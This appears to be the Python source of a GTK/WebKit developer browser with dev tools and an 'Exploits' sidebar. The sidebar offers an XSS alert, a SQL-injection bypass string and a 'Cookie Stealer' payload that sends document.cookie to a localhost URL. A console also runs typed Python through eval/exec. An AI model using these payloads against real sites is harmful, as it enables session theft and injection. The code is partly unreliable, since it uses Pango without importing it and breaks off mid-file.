import sys
import gi
import os
import json
import base64
from datetime import datetime
gi.require_version('Gtk', '3.0')
gi.require_version('WebKit2', '4.1')
from gi.repository import Gtk, Gdk, GLib
from gi.repository import WebKit2

START_PAGE_HTML = """
<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title>Zero Browser Start</title>
    <style>
        body { margin: 0; padding: 0; background: #0f1115; color: #ffffff; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
        .container { background: rgba(255, 255, 255, 0.03); border: 1px solid rgba(255, 255, 255, 0.05); border-radius: 24px; padding: 40px; text-align: center; box-shadow: 0 20px 40px rgba(0,0,0,0.5); backdrop-filter: blur(20px); -webkit-backdrop-filter: blur(20px); animation: fadein 0.5s ease-out; }
        @keyframes fadein { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
        h1 { font-size: 48px; font-weight: 800; margin: 0 0 10px 0; background: linear-gradient(90deg, #4D90FE, #00C853); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
        p { color: #A0AAB5; font-size: 16px; margin-bottom: 30px; }
        .search-box { display: flex; align-items: center; background: rgba(0,0,0,0.3); border: 1px solid rgba(255,255,255,0.1); border-radius: 30px; padding: 10px 20px; margin-bottom: 30px; width: 400px; transition: all 0.3s ease; }
        .search-box:focus-within { border-color: #4D90FE; box-shadow: 0 0 15px rgba(77,144,254,0.2); }
        .search-box input { background: transparent; border: none; color: white; font-size: 16px; width: 100%; outline: none; }
        .grid { display: grid; grid-template-columns: repeat(4, 1fr); gap: 15px; }
        .card { background: rgba(255,255,255,0.02); border: 1px solid rgba(255,255,255,0.05); border-radius: 12px; padding: 20px 10px; text-decoration: none; color: white; font-size: 14px; font-weight: 500; transition: all 0.2s; }
        .card:hover { background: rgba(255,255,255,0.08); transform: translateY(-2px); border-color: rgba(255,255,255,0.2); }
    </style>
</head>
<body>
    <div class="container">
        <h1 id="time">00:00</h1>
        <p>Welcome to Zero Browser.</p>
        <div class="search-box">
            <input type="text" id="q" placeholder="Search the web or enter URL..." autofocus>
        </div>
        <div class="grid">
            <a href="https://github.com" class="card">GitHub</a>
            <a href="https://stackoverflow.com" class="card">StackOverflow</a>
            <a href="https://youtube.com" class="card">YouTube</a>
            <a href="https://x.com" class="card">X (Twitter)</a>
        </div>
    </div>
    <script>
        function updateTime() { const now = new Date(); document.getElementById('time').innerText = now.toLocaleTimeString([], {hour: '2-digit', minute:'2-digit'}); }
        setInterval(updateTime, 1000); updateTime();
        document.getElementById('q').addEventListener('keypress', function(e) {
            if(e.key === 'Enter') {
                let val = this.value;
                if(val.includes('.') && !val.includes(' ')) { if(!val.startsWith('http')) val = 'https://' + val; window.location.href = val; } 
                else { window.location.href = 'https://google.com/search?q=' + encodeURIComponent(val); }
            }
        });
    </script>
</body>
</html>
"""

SCROLLBAR_CSS = "::-webkit-scrollbar { width: 8px; height: 8px; background: #12141a; } ::-webkit-scrollbar-thumb { background: #3a3f4b; border-radius: 4px; } ::-webkit-scrollbar-thumb:hover { background: #4d90fe; } ::-webkit-scrollbar-corner { background: #12141a; }"
COSMETIC_ADBLOCK_CSS = ".adsbygoogle, .ad-container, .ad-slot, .ad-banner, .pub_300x250, .pub_300x250m, .pub_728x90, .text-ad, .textAd, .text_ad, .text_ads, .text-ads, .text-ad-links, div[id^='div-gpt-ad-'], div[id^='google_ads_iframe_'], iframe[id^='google_ads_iframe_'], div[class*='Sponsored'], div[class*='sponsored'], div[class*='Advert'], div[class*='advert'] { display: none !important; }"

class ZeroDevBrowser(Gtk.Window):
    def __init__(self):
        super().__init__(title="Zero Browser")
        self.set_default_size(1280, 800)
        
        settings = Gtk.Settings.get_default()
        settings.set_property("gtk-application-prefer-dark-theme", True)
        
        self.setup_css()
        
        self.history_store = Gtk.ListStore(str, str) 
        self.downloads_store = Gtk.ListStore(str, str, str)
        self.bookmarks_store = Gtk.ListStore(str, str)
        self.tabs_map = {} 
        
        self.bm_path = os.path.join(os.path.expanduser("~"), ".zero_bookmarks.json")
        self.load_bookmarks()
        
        self.main_vbox = Gtk.Box(orientation=Gtk.Orientation.VERTICAL)
        self.add(self.main_vbox)
        
        self.header = Gtk.HeaderBar()
        self.header.set_show_close_button(True)
        self.header.set_title("Zero Browser")
        self.set_titlebar(self.header)

        self.btn_sidebar = Gtk.ToggleButton()
        self.btn_sidebar.add(Gtk.Image.new_from_icon_name("view-sidebar-symbolic", Gtk.IconSize.MENU))
        self.btn_sidebar.set_tooltip_text("Toggle Data Sidebar")
        self.btn_sidebar.connect("toggled", self.on_sidebar_toggled)
        self.header.pack_start(self.btn_sidebar)
        
        self.btn_tabs = Gtk.ToggleButton()
        self.btn_tabs.set_active(True)
        self.btn_tabs.add(Gtk.Image.new_from_icon_name("format-justify-left-symbolic", Gtk.IconSize.MENU))
        self.btn_tabs.set_tooltip_text("Toggle Vertical Tabs")
        self.btn_tabs.connect("toggled", self.on_tabs_toggled)
        self.header.pack_start(self.btn_tabs)

        btn_back = Gtk.Button(); btn_back.add(Gtk.Image.new_from_icon_name("go-previous-symbolic", Gtk.IconSize.MENU))
        btn_forward = Gtk.Button(); btn_forward.add(Gtk.Image.new_from_icon_name("go-next-symbolic", Gtk.IconSize.MENU))
        btn_back.connect("clicked", lambda b: self.current_webview.go_back() if hasattr(self, 'current_webview') else None)
        btn_forward.connect("clicked", lambda b: self.current_webview.go_forward() if hasattr(self, 'current_webview') else None)
        for b in (btn_back, btn_forward): self.header.pack_start(b)

        self.url_bar = Gtk.Entry()
        self.url_bar.set_placeholder_text("Search or enter web address")
        self.url_bar.set_width_chars(60)
        self.url_bar.connect("activate", self.on_url_activate)
        self.url_bar.set_icon_from_icon_name(Gtk.EntryIconPosition.PRIMARY, "network-secure-symbolic")
        self.url_bar.set_icon_from_icon_name(Gtk.EntryIconPosition.SECONDARY, "view-refresh-symbolic")
        self.url_bar.connect("icon-press", lambda e, p, ev: self.current_webview.reload() if hasattr(self, 'current_webview') and p == Gtk.EntryIconPosition.SECONDARY else None)
        self.header.set_custom_title(self.url_bar)

        self.btn_pip = Gtk.Button()
        self.btn_pip.add(Gtk.Image.new_from_icon_name("media-playback-start-symbolic", Gtk.IconSize.MENU))
        self.btn_pip.set_tooltip_text("Picture-in-Picture (Pop out video)")
        self.btn_pip.connect("clicked", self.on_pip_toggled)
        self.header.pack_end(self.btn_pip)

        self.btn_screenshot = Gtk.Button()
        self.btn_screenshot.add(Gtk.Image.new_from_icon_name("camera-photo-symbolic", Gtk.IconSize.MENU))
        self.btn_screenshot.set_tooltip_text("Screenshot Page (Full)")
        self.btn_screenshot.connect("clicked", self.on_take_screenshot)
        self.header.pack_end(self.btn_screenshot)

        self.btn_bookmark = Gtk.Button()
        self.btn_bookmark.add(Gtk.Image.new_from_icon_name("bookmark-new-symbolic", Gtk.IconSize.MENU))
        self.btn_bookmark.set_tooltip_text("Bookmark Current Page")
        self.btn_bookmark.connect("clicked", self.on_add_bookmark)
        self.header.pack_end(self.btn_bookmark)
        
        self.btn_devtools = Gtk.ToggleButton()
        self.btn_devtools.add(Gtk.Image.new_from_icon_name("preferences-system-symbolic", Gtk.IconSize.MENU))
        self.btn_devtools.set_tooltip_text("Toggle Hacker Tools")
        self.btn_devtools.connect("toggled", self.on_devtools_toggled)
        self.header.pack_end(self.btn_devtools)

        self.btn_newtab = Gtk.Button()
        self.btn_newtab.add(Gtk.Image.new_from_icon_name("tab-new-symbolic", Gtk.IconSize.MENU))
        self.btn_newtab.set_tooltip_text("New Tab")
        self.btn_newtab.connect("clicked", lambda b: self.new_tab("zero://start"))
        self.header.pack_end(self.btn_newtab)

        self.hpaned_main = Gtk.Paned(orientation=Gtk.Orientation.HORIZONTAL)
        self.main_vbox.pack_start(self.hpaned_main, True, True, 0)
        
        self.sidebar_revealer = Gtk.Revealer(); self.sidebar_revealer.set_transition_type(Gtk.RevealerTransitionType.SLIDE_RIGHT); self.sidebar_revealer.set_reveal_child(False)
        self.sidebar_box = self.build_sidebar(); self.sidebar_revealer.add(self.sidebar_box)
        self.hpaned_main.pack1(self.sidebar_revealer, False, False)
        
        self.hpaned_workspace = Gtk.Paned(orientation=Gtk.Orientation.HORIZONTAL)
        self.hpaned_main.pack2(self.hpaned_workspace, True, False)
        
        self.tabs_revealer = Gtk.Revealer(); self.tabs_revealer.set_transition_type(Gtk.RevealerTransitionType.SLIDE_RIGHT); self.tabs_revealer.set_reveal_child(True)
        self.tabs_box = self.build_tabs_sidebar(); self.tabs_revealer.add(self.tabs_box)
        self.hpaned_workspace.pack1(self.tabs_revealer, False, False)
        
        self.vpaned = Gtk.Paned(orientation=Gtk.Orientation.VERTICAL)
        self.hpaned_workspace.pack2(self.vpaned, True, False)
        
        self.tab_stack = Gtk.Stack(); self.tab_stack.set_transition_type(Gtk.StackTransitionType.CROSSFADE)
        self.vpaned.pack1(self.tab_stack, True, False)
        
        self.devtools_revealer = Gtk.Revealer(); self.devtools_revealer.set_transition_type(Gtk.RevealerTransitionType.SLIDE_UP); self.devtools_revealer.set_reveal_child(False)
        self.devtools_box = self.build_devtools(); self.devtools_revealer.add(self.devtools_box)
        self.vpaned.pack2(self.devtools_revealer, False, False)
        
        self.web_ctx = WebKit2.WebContext.new_ephemeral()
        self.web_ctx.connect("download-started", self.on_download_started)
        
        self.user_content = WebKit2.UserContentManager.new()
        for css in (SCROLLBAR_CSS, COSMETIC_ADBLOCK_CSS):
            sheet = WebKit2.UserStyleSheet(css, WebKit2.UserContentInjectedFrames.ALL_FRAMES, WebKit2.UserStyleLevel.USER, None, None)
            self.user_content.add_style_sheet(sheet)
        
        self.adblock_enabled = True
        self.new_tab("zero://start")

    def on_pip_toggled(self, btn):
        if not hasattr(self, 'current_webview'): return
        js = "if(document.pictureInPictureElement){document.exitPictureInPicture();}else{const v=document.querySelector('video');if(v){v.requestPictureInPicture();}}"
        self.current_webview.run_javascript(js, None, None, None)

    def on_take_screenshot(self, btn):
        if not hasattr(self, 'current_webview'): return
        def on_snapshot_ready(webview, result):
            try:
                surface = webview.get_snapshot_finish(result)
                if surface:
                    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
                    filepath = os.path.join(os.path.expanduser("~"), "Downloads", f"zero_screenshot_{ts}.png")
                    surface.write_to_png(filepath)
                    btn.set_image(Gtk.Image.new_from_icon_name("emblem-ok-symbolic", Gtk.IconSize.MENU))
                    GLib.timeout_add(1500, lambda: btn.set_image(Gtk.Image.new_from_icon_name("camera-photo-symbolic", Gtk.IconSize.MENU)) and False)
            except: pass
        self.current_webview.get_snapshot(WebKit2.SnapshotRegion.FULL_DOCUMENT, WebKit2.SnapshotOptions.NONE, None, on_snapshot_ready)

    def build_tabs_sidebar(self):
        box = Gtk.Box(orientation=Gtk.Orientation.VERTICAL); box.set_size_request(200, -1); box.get_style_context().add_class("vertical-tabs-box")
        lbl = Gtk.Label(label="OPEN TABS"); lbl.set_halign(Gtk.Align.START); lbl.set_margin_top(10); lbl.set_margin_bottom(10); lbl.set_margin_start(10); lbl.get_style_context().add_class("tabs-header"); box.pack_start(lbl, False, False, 0)
        self.tab_listbox = Gtk.ListBox(); self.tab_listbox.get_style_context().add_class("vertical-tabs-list"); self.tab_listbox.connect("row-activated", self.on_tab_clicked)
        scroll = Gtk.ScrolledWindow(); scroll.add(self.tab_listbox); box.pack_start(scroll, True, True, 0)
        return box

    def on_tabs_toggled(self, btn): self.tabs_revealer.set_reveal_child(btn.get_active())

    def on_tab_clicked(self, listbox, row):
        wid = row.get_name(); self.tab_stack.set_visible_child_name(wid); wv = self.tabs_map[wid][0]; self.current_webview = wv
        self.url_bar.set_text(wv.get_uri() or ""); self.header.set_title(wv.get_title() or "Zero Browser")

    def close_tab(self, wid, btn=None):
        if wid in self.tabs_map:
            wv, row = self.tabs_map[wid]
            self.tab_listbox.remove(row); self.tab_stack.remove(self.tab_stack.get_child_by_name(wid)); wv.destroy(); del self.tabs_map[wid]
            children = self.tab_listbox.get_children()
            if children: self.tab_listbox.select_row(children[0]); self.on_tab_clicked(self.tab_listbox, children[0])
            else: self.new_tab("zero://start")

    def load_bookmarks(self):
        if os.path.exists(self.bm_path):
            try:
                with open(self.bm_path, 'r') as f:
                    for title, url in json.load(f): self.bookmarks_store.append([title, url])
            except: pass
    def save_bookmarks(self):
        with open(self.bm_path, 'w') as f: json.dump([[r[0], r[1]] for r in self.bookmarks_store], f)
    def on_add_bookmark(self, btn):
        if hasattr(self, 'current_webview'):
            uri = self.current_webview.get_uri()
            if uri and not uri.startswith("zero://"):
                self.bookmarks_store.append([self.current_webview.get_title() or "Untitled", uri]); self.save_bookmarks()
                btn.set_image(Gtk.Image.new_from_icon_name("emblem-ok-symbolic", Gtk.IconSize.MENU))
                GLib.timeout_add(1000, lambda: btn.set_image(Gtk.Image.new_from_icon_name("bookmark-new-symbolic", Gtk.IconSize.MENU)) and False)
    def on_sidebar_toggled(self, btn): self.sidebar_revealer.set_reveal_child(btn.get_active())
    def on_devtools_toggled(self, btn): self.devtools_revealer.set_reveal_child(btn.get_active())

    def build_sidebar(self):
        box = Gtk.Box(orientation=Gtk.Orientation.VERTICAL); box.set_size_request(250, -1)
        nb = Gtk.Notebook(); nb.set_tab_pos(Gtk.PositionType.BOTTOM)
        bm_tree = Gtk.TreeView(model=self.bookmarks_store); r_bm = Gtk.CellRendererText(); bm_tree.append_column(Gtk.TreeViewColumn("Title", r_bm, text=0)); bm_tree.connect("row-activated", self.on_history_activated); scroll0 = Gtk.ScrolledWindow(); scroll0.add(bm_tree); nb.append_page(scroll0, Gtk.Label(label="Bookmarks"))
        hist_tree = Gtk.TreeView(model=self.history_store); renderer = Gtk.CellRendererText(); hist_tree.append_column(Gtk.TreeViewColumn("Time", renderer, text=0)); hist_tree.append_column(Gtk.TreeViewColumn("URL", renderer, text=1)); hist_tree.connect("row-activated", self.on_history_activated); scroll1 = Gtk.ScrolledWindow(); scroll1.add(hist_tree); nb.append_page(scroll1, Gtk.Label(label="History"))
        dl_tree = Gtk.TreeView(model=self.downloads_store); r2 = Gtk.CellRendererText(); dl_tree.append_column(Gtk.TreeViewColumn("File", r2, text=0)); dl_tree.append_column(Gtk.TreeViewColumn("Prog", r2, text=2)); scroll2 = Gtk.ScrolledWindow(); scroll2.add(dl_tree); nb.append_page(scroll2, Gtk.Label(label="Downloads"))
        plist = Gtk.ListBox()
        for title, p in [("XSS Alert", "javascript:alert(1)"), ("SQLi Bypass", "' OR '1'='1"), ("Cookie Stealer", "javascript:fetch('http://localhost/?c='+document.cookie)")]:
            row = Gtk.ListBoxRow(); v = Gtk.Box(orientation=Gtk.Orientation.VERTICAL); lt = Gtk.Label(label=title); lt.set_halign(Gtk.Align.START); lt.get_style_context().add_class("bold-label"); lp = Gtk.Label(label=p); lp.set_halign(Gtk.Align.START); lp.set_line_wrap(True); v.pack_start(lt, False, False, 2); v.pack_start(lp, False, False, 2); row.add(v); plist.add(row)
        plist.connect("row-activated", self.on_payload_activated); scroll3 = Gtk.ScrolledWindow(); scroll3.add(plist); nb.append_page(scroll3, Gtk.Label(label="Exploits"))
        box.pack_start(nb, True, True, 0)
        return box

    def build_devtools(self):
        box = Gtk.Box(orientation=Gtk.Orientation.VERTICAL); box.set_size_request(-1, 280)
        toolbar = Gtk.Toolbar(); toolbar.get_style_context().add_class("primary-toolbar")
        self.dev_stack = Gtk.Stack(); self.dev_stack.set_transition_type(Gtk.StackTransitionType.CROSSFADE)
        switcher = Gtk.StackSwitcher(); switcher.set_stack(self.dev_stack)
        toolbar_item = Gtk.ToolItem(); toolbar_item.add(switcher); toolbar.insert(toolbar_item, 0)
        
        sec_box = Gtk.Box(orientation=Gtk.Orientation.HORIZONTAL, spacing=5)
        self.btn_adblock = Gtk.ToggleButton(label="Adblock ON"); self.btn_adblock.set_active(True); self.btn_adblock.connect("toggled", self.on_adblock_toggled); sec_box.pack_start(self.btn_adblock, False, False, 0)
        self.ua_combo = Gtk.ComboBoxText(); self.ua_combo.append("default", "Standard UA"); self.ua_combo.append("mobile", "Mobile (iPhone)"); self.ua_combo.append("bot", "Googlebot"); self.ua_combo.set_active(0); self.ua_combo.connect("changed", self.on_ua_changed); sec_box.pack_end(self.ua_combo, False, False, 0)
        self.btn_webrtc = Gtk.ToggleButton(label="WebRTC Leak"); self.btn_webrtc.connect("toggled", self.on_webrtc_toggled); self.btn_cors = Gtk.ToggleButton(label="CORS Strict"); self.btn_cors.connect("toggled", self.on_cors_toggled); sec_box.pack_end(self.btn_cors, False, False, 0); sec_box.pack_end(self.btn_webrtc, False, False, 0)
        
        ti_sec = Gtk.ToolItem(); ti_sec.set_expand(True); ti_sec.add(sec_box); toolbar.insert(ti_sec, 1)
        box.pack_start(toolbar, False, False, 0); box.pack_start(self.dev_stack, True, True, 0)
        
        self.dev_stack.add_titled(self.build_js_console(), "js", "JS Console"); self.dev_stack.add_titled(self.build_network_panel(), "network", "Network"); self.dev_stack.add_titled(self.build_cookie_explorer(), "cookies", "Cookies"); self.dev_stack.add_titled(self.build_storage_explorer(), "storage", "Storage"); self.dev_stack.add_titled(self.build_source_viewer(), "source", "DOM Source"); self.dev_stack.add_titled(self.build_css_panel(), "css", "CSS Inject"); self.dev_stack.add_titled(self.build_terminal_emulator(), "term", "Python Term")
        self.dev_stack.connect("notify::visible-child", self.on_dev_stack_changed)
        return box

    def on_adblock_toggled(self, btn):
        self.adblock_enabled = btn.get_active(); btn.set_label("Adblock ON" if self.adblock_enabled else "Adblock OFF")
        self.user_content.remove_all_style_sheets()
        self.user_content.add_style_sheet(WebKit2.UserStyleSheet(SCROLLBAR_CSS, WebKit2.UserContentInjectedFrames.ALL_FRAMES, WebKit2.UserStyleLevel.USER, None, None))
        if self.adblock_enabled: self.user_content.add_style_sheet(WebKit2.UserStyleSheet(COSMETIC_ADBLOCK_CSS, WebKit2.UserContentInjectedFrames.ALL_FRAMES, WebKit2.UserStyleLevel.USER, None, None))
        if hasattr(self, 'current_webview'): self.current_webview.reload()

    def on_ua_changed(self, combo):
        val = combo.get_active_id(); ua = "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1" if val == "mobile" else "Googlebot/2.1 (+http://www.google.com/bot.html)" if val == "bot" else None
        if hasattr(self, 'current_webview'):
            settings = self.current_webview.get_settings(); settings.set_user_agent(ua) if ua else settings.set_user_agent(None); self.current_webview.set_settings(settings); self.current_webview.reload()

    def on_dev_stack_changed(self, stack, param):
        name = stack.get_visible_child_name()
        if name == "cookies": self.refresh_cookies()
        elif name == "storage": self.refresh_storage()
        elif name == "source": self.on_fetch_source(None)

    def on_history_activated(self, treeview, path, column):
        self.url_bar.set_text(treeview.get_model()[path][1]); self.on_url_activate(self.url_bar)
        
    def on_payload_activated(self, listbox, row):
        payload = row.get_child().get_children()[1].get_text(); url = self.url_bar.get_text()
        if payload.startswith("javascript:"):
            if hasattr(self, 'current_webview'): self.current_webview.run_javascript(payload[11:], None, None, None)
        else: self.url_bar.set_text(url + payload); self.url_bar.grab_focus()

    def on_download_started(self, context, download):
        filename = download.get_request().get_uri().split("/")[-1] or "downloaded_file"
        download.set_destination("file://" + os.path.join(os.path.expanduser("~"), "Downloads", filename))
        iter_ref = self.downloads_store.append([filename, "Downloading...", "0%"])
        download.connect("received-data", lambda dl, l, i=iter_ref: self.downloads_store.__setitem__(i, 2, f"{int(dl.get_estimated_progress() * 100)}%"))
        download.connect("finished", lambda dl, i=iter_ref: (self.downloads_store.__setitem__(i, 1, "Finished"), self.downloads_store.__setitem__(i, 2, "100%")))
        download.connect("failed", lambda dl, e, i=iter_ref: self.downloads_store.__setitem__(i, 1, "Failed"))

    def build_terminal_emulator(self): box = Gtk.Box(orientation=Gtk.Orientation.VERTICAL); self.term_output = Gtk.TextView(); self.term_output.set_editable(False); scroll = Gtk.ScrolledWindow(); scroll.add(self.term_output); box.pack_start(scroll, True, True, 0); entry = Gtk.Entry(); entry.connect("activate", self.on_term_execute); box.pack_start(entry, False, False, 0); return box
    def build_css_panel(self): box = Gtk.Box(orientation=Gtk.Orientation.VERTICAL); self.css_text = Gtk.TextView(); scroll = Gtk.ScrolledWindow(); scroll.add(self.css_text); box.pack_start(scroll, True, True, 0); btn = Gtk.Button(label="Inject CSS to Tab"); btn.connect("clicked", self.on_inject_css); box.pack_start(btn, False, False, 0); return box
    def build_source_viewer(self): box = Gtk.Box(orientation=Gtk.Orientation.VERTICAL); self.source_text = Gtk.TextView(); self.source_text.set_editable(False); scroll = Gtk.ScrolledWindow(); scroll.add(self.source_text); box.pack_start(scroll, True, True, 0); btn = Gtk.Button(label="Refresh DOM"); btn.connect("clicked", self.on_fetch_source); box.pack_start(btn, False, False, 0); return box
    def build_cookie_explorer(self): box = Gtk.Box(orientation=Gtk.Orientation.VERTICAL); self.cookie_list = Gtk.ListBox(); scroll = Gtk.ScrolledWindow(); scroll.add(self.cookie_list); box.pack_start(scroll, True, True, 0); return box
    def build_storage_explorer(self): box = Gtk.Box(orientation=Gtk.Orientation.VERTICAL); controls = Gtk.Box(orientation=Gtk.Orientation.HORIZONTAL, spacing=5); self.ls_key = Gtk.Entry(); self.ls_val = Gtk.Entry(); btn = Gtk.Button(label="+ Add"); btn.connect("clicked", self.on_add_storage); [controls.pack_start(w, True if w != btn else False, True if w != btn else False, 0) for w in (self.ls_key, self.ls_val, btn)]; box.pack_start(controls, False, False, 0); self.storage_list = Gtk.ListBox(); scroll = Gtk.ScrolledWindow(); scroll.add(self.storage_list); box.pack_start(scroll, True, True, 0); return box
    def build_network_panel(self): box = Gtk.Box(orientation=Gtk.Orientation.VERTICAL); self.network_list = Gtk.ListBox(); scroll = Gtk.ScrolledWindow(); scroll.add(self.network_list); box.pack_start(scroll, True, True, 0); btn = Gtk.Button(label="Clear"); btn.connect("clicked", self.on_clear_network); box.pack_end(btn, False, False, 0); return box
    def build_js_console(self): box = Gtk.Box(orientation=Gtk.Orientation.VERTICAL); self.js_output = Gtk.TextView(); self.js_output.set_editable(False); self.js_output.get_buffer().set_text("> "); scroll = Gtk.ScrolledWindow(); scroll.add(self.js_output); box.pack_start(scroll, True, True, 0); entry = Gtk.Entry(); entry.connect("activate", self.on_js_execute); box.pack_start(entry, False, False, 0); return box

    def on_js_execute(self, entry):
        if not hasattr(self, 'current_webview'): return
        js_cmd = entry.get_text(); buf = self.js_output.get_buffer(); buf.insert(buf.get_end_iter(), js_cmd + "\n"); entry.set_text("")
        def on_js_finish(w, r, u):
            try:
                val = w.run_javascript_finish(r).get_js_value()
                out = val.to_string() if val.is_string() else str(val.to_double()) if val.is_number() else str(val.to_boolean()) if val.is_boolean() else "null" if val.is_null() else "undefined" if val.is_undefined() else "[Object]"
                buf.insert(buf.get_end_iter(), "<- " + out + "\n> ")
            except Exception as e: buf.insert(buf.get_end_iter(), f"Error: {e}\n> ")
        self.current_webview.run_javascript(js_cmd, None, on_js_finish, None)

    def on_clear_network(self, btn):
        for child in self.network_list.get_children(): self.network_list.remove(child)

    def on_resource_load(self, webview, resource, request):
        uri = request.get_uri(); method = request.get_http_method() or "GET" if hasattr(request, 'get_http_method') else "GET"
        row = Gtk.ListBoxRow(); hbox = Gtk.Box(orientation=Gtk.Orientation.HORIZONTAL, spacing=5)
        lm = Gtk.Label(label=f"[{method}]"); lm.get_style_context().add_class("bold-label"); lu = Gtk.Label(label=uri); lu.set_halign(Gtk.Align.START)
        hbox.pack_start(lm, False, False, 0); hbox.pack_start(lu, True, True, 0); row.add(hbox); self.network_list.add(row); self.network_list.show_all()
        if self.adblock_enabled and any(ad in uri for ad in ["doubleclick.net", "google-analytics.com", "googlesyndication.com", "amazon-adsystem.com", "adsrvr.org"]): pass

    def refresh_cookies(self, btn=None):
        if not hasattr(self, 'current_webview'): return
        for child in self.cookie_list.get_children(): self.cookie_list.remove(child)
        def on_js_finish(w, r, u):
            try:
                for c in w.run_javascript_finish(r).get_js_value().to_string().split(";"):
                    if "=" not in c: continue
                    k, v = c.split("=", 1); row = Gtk.ListBoxRow(); hbox = Gtk.Box(orientation=Gtk.Orientation.HORIZONTAL, spacing=5)
                    lk = Gtk.Label(label=k.strip()); lk.get_style_context().add_class("bold-label"); lk.set_size_request(150, -1); lk.set_halign(Gtk.Align.START); lv = Gtk.Label(label=v.strip()); lv.set_halign(Gtk.Align.START)
                    hbox.pack_start(lk, False, False, 0); hbox.pack_start(lv, True, True, 0); row.add(hbox); self.cookie_list.add(row)
                self.cookie_list.show_all()
            except: pass
        self.current_webview.run_javascript("document.cookie", None, on_js_finish, None)

    def refresh_storage(self, btn=None):
        if not hasattr(self, 'current_webview'): return
        for child in self.storage_list.get_children(): self.storage_list.remove(child)
        def on_js_finish(w, r, u):
            try:
                for k, v in json.loads(w.run_javascript_finish(r).get_js_value().to_string()).items():
                    row = Gtk.ListBoxRow(); hbox = Gtk.Box(orientation=Gtk.Orientation.HORIZONTAL, spacing=5)
                    lk = Gtk.Label(label=k); lk.get_style_context().add_class("bold-label"); lk.set_size_request(150, -1); lk.set_halign(Gtk.Align.START); lv = Gtk.Label(label=str(v)); lv.set_halign(Gtk.Align.START)
                    hbox.pack_start(lk, False, False, 0); hbox.pack_start(lv, True, True, 0); row.add(hbox); self.storage_list.add(row)
                self.storage_list.show_all()
            except: pass
        self.current_webview.run_javascript("JSON.stringify(localStorage);", None, on_js_finish, None)

    def on_add_storage(self, btn):
        k, v = self.ls_key.get_text().strip(), self.ls_val.get_text().strip()
        if k and v: self.current_webview.run_javascript(f"localStorage.setItem('{k}', '{v}');", None, None, None); self.ls_key.set_text(""); self.ls_val.set_text(""); self.refresh_storage()

    def on_fetch_source(self, btn):
        if not hasattr(self, 'current_webview'): return
        def on_js_finish(w, r, u):
            try: self.source_text.get_buffer().set_text(w.run_javascript_finish(r).get_js_value().to_string())
            except: pass
        self.current_webview.run_javascript("document.documentElement.outerHTML", None, on_js_finish, None)

    def on_inject_css(self, btn):
        buf = self.css_text.get_buffer(); css = buf.get_text(buf.get_start_iter(), buf.get_end_iter(), True).replace("`", "\\`")
        self.current_webview.run_javascript(f"var s = document.createElement('style'); s.innerHTML = `{css}`; document.head.appendChild(s);", None, None, None)

    def on_term_execute(self, entry):
        cmd = entry.get_text(); buf = self.term_output.get_buffer(); buf.insert(buf.get_end_iter(), cmd + "\n")
        try: buf.insert(buf.get_end_iter(), str(eval(cmd)) + "\n>>> ")
        except:
            try: exec(cmd); buf.insert(buf.get_end_iter(), "Executed.\n>>> ")
            except Exception as ex: buf.insert(buf.get_end_iter(), f"Error: {ex}\n>>> ")
        entry.set_text("")

    def new_tab(self, url):
        webview = WebKit2.WebView.new_with_user_content_manager(self.user_content)
        webview.connect("resource-load-started", self.on_resource_load)
        settings = webview.get_settings(); settings.set_enable_developer_extras(True)
        ua_val = self.ua_combo.get_active_id() if hasattr(self, 'ua_combo') else 'default'
        if ua_val == 'mobile': settings.set_user_agent("Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1")
        elif ua_val == 'bot': settings.set_user_agent("Googlebot/2.1 (+http://www.google.com/bot.html)")
        webview.set_settings(settings)
        
        if url == "zero://start": webview.load_html(START_PAGE_HTML, "zero://start")
        else: webview.load_uri(url)
            
        scrolled = Gtk.ScrolledWindow(); scrolled.add(webview)
        wid = "tab_" + str(id(webview))
        self.tab_stack.add_named(scrolled, wid)
        
        row = Gtk.ListBoxRow(); row.set_name(wid)
        hbox = Gtk.Box(orientation=Gtk.Orientation.HORIZONTAL, spacing=5)
        hbox.set_margin_top(5); hbox.set_margin_bottom(5); hbox.set_margin_start(10); hbox.set_margin_end(5)
        icon = Gtk.Image.new_from_icon_name("text-html-symbolic", Gtk.IconSize.MENU)
        label = Gtk.Label(label="New Tab")
        label.set_halign(Gtk.Align.START); label.set_ellipsize(Pango.EllipsizeMode.END); label.set_max_width_chars(15)
        btn_close = Gtk.Button(); btn_close.add(Gtk.Image.new_from_icon_name("window-close-symbolic", Gtk.IconSize.MENU))
        btn_close.set_relief(Gtk.ReliefStyle.NONE); btn_close.connect("clicked", lambda b: self.close_tab(wid, b))
        
        hbox.pack_start(icon, False, False, 0); hbox.pack_start(label, True, True, 0); hbox.pack_end(btn_close, False, False, 0)
        row.add(hbox); row.show_all()
        
        self.tab_listbox.add(row); self.tabs_map[wid] = (webview, row); self.tab_stack.show_all()
        self.tab_listbox.select_row(row); self.on_tab_clicked(self.tab_listbox, row)
        
        def on_uri(w, p):
            uri = w.get_uri() or ""
            if self.current_webview == w: self.url_bar.set_text(uri)
            if uri != "zero://start" and not uri.startswith("about:"): self.history_store.append([datetime.now().strftime("%H:%M"), uri])
            
        def on_title(w, p):
            title = w.get_title() or "Untitled"
            label.set_text(title)
            if self.current_webview == w: self.header.set_title(title)
            
        webview.connect("notify::uri", on_uri); webview.connect("notify::title", on_title)

    def on_url_activate(self, entry):
        url = entry.get_text()
        if url == "zero://start":
            if hasattr(self, 'current_webview'): self.current_webview.load_html(START_PAGE_HTML, "zero://start")
            return
        if not url.startswith("http"): url = "https://" + url
        if hasattr(self, 'current_webview'): self.current_webview.load_uri(url)

    def setup_css(self):
        css = b'''
            .bold-label { font-weight: bold; }
            .vertical-tabs-box { background: #16181D; border-right: 1px solid rgba(255,255,255,0.05); }
            .tabs-header { color: #8090A0; font-size: 11px; font-weight: bold; letter-spacing: 1px; }
            .vertical-tabs-list { background: transparent; }
